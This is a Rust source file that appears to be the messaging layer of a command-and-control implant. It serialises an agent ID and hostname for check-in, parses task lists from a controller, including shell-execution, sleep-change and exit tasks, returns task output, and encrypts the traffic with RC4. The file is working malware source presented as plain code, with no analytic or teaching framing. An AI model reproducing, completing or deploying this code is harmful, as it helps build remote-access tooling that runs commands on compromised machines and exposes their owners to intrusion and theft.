use crate::payload::encrypt::rc4_crypt;

const MSG_CHECKIN: u8 = 0x01;
const MSG_TASK_LIST: u8 = 0x02;
const MSG_RESULT: u8 = 0x03;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum TaskType {
    Nop = 0,
    Shell = 1,
    SleepChange = 2,
    Exit = 3,
}

impl TaskType {
    pub fn from_u8(v: u8) -> Option<Self> {
        match v {
            0 => Some(Self::Nop),
            1 => Some(Self::Shell),
            2 => Some(Self::SleepChange),
            3 => Some(Self::Exit),
            _ => None,
        }
    }
}

#[derive(Debug, Clone)]
pub struct Task {
    pub id: u32,
    pub task_type: TaskType,
    pub data: Vec<u8>,
}

fn write_u32_le(buf: &mut Vec<u8>, val: u32) {
    buf.extend_from_slice(&val.to_le_bytes());
}

fn read_u32_le(data: &[u8], offset: usize) -> Result<u32, String> {
    if offset + 4 > data.len() {
        return Err(format!("unexpected end of data at offset {}", offset));
    }
    Ok(u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ]))
}

pub fn serialize_checkin(agent_id: &[u8; 16], hostname: &str, sleep_ms: u32) -> Vec<u8> {
    let host_bytes = hostname.as_bytes();
    let mut buf = Vec::with_capacity(1 + 16 + 4 + host_bytes.len() + 4);
    buf.push(MSG_CHECKIN);
    buf.extend_from_slice(agent_id);
    write_u32_le(&mut buf, host_bytes.len() as u32);
    buf.extend_from_slice(host_bytes);
    write_u32_le(&mut buf, sleep_ms);
    buf
}

pub fn serialize_result(agent_id: &[u8; 16], task_id: u32, success: bool, output: &[u8]) -> Vec<u8> {
    let mut buf = Vec::with_capacity(1 + 16 + 4 + 1 + 4 + output.len());
    buf.push(MSG_RESULT);
    buf.extend_from_slice(agent_id);
    write_u32_le(&mut buf, task_id);
    buf.push(if success { 0x00 } else { 0x01 });
    write_u32_le(&mut buf, output.len() as u32);
    buf.extend_from_slice(output);
    buf
}

pub fn parse_task_list(data: &[u8]) -> Result<Vec<Task>, String> {
    if data.is_empty() {
        return Err("empty response".to_string());
    }
    if data[0] != MSG_TASK_LIST {
        return Err(format!("unexpected message type 0x{:02X}", data[0]));
    }
    let num_tasks = read_u32_le(data, 1)? as usize;
    let mut tasks = Vec::with_capacity(num_tasks);
    let mut offset = 5;
    for _ in 0..num_tasks {
        let task_id = read_u32_le(data, offset)?;
        offset += 4;
        if offset >= data.len() {
            return Err("truncated task entry".to_string());
        }
        let task_type = TaskType::from_u8(data[offset])
            .ok_or_else(|| format!("unknown task type 0x{:02X}", data[offset]))?;
        offset += 1;
        let data_len = read_u32_le(data, offset)? as usize;
        offset += 4;
        if offset + data_len > data.len() {
            return Err("truncated task data".to_string());
        }
        let task_data = data[offset..offset + data_len].to_vec();
        offset += data_len;
        tasks.push(Task {
            id: task_id,
            task_type,
            data: task_data,
        });
    }
    Ok(tasks)
}

pub fn encrypt_message(plaintext: &[u8], key: &[u8]) -> Vec<u8> {
    rc4_crypt(plaintext, key)
}

pub fn decrypt_message(ciphertext: &[u8], key: &[u8]) -> Vec<u8> {
    rc4_crypt(ciphertext, key)
}
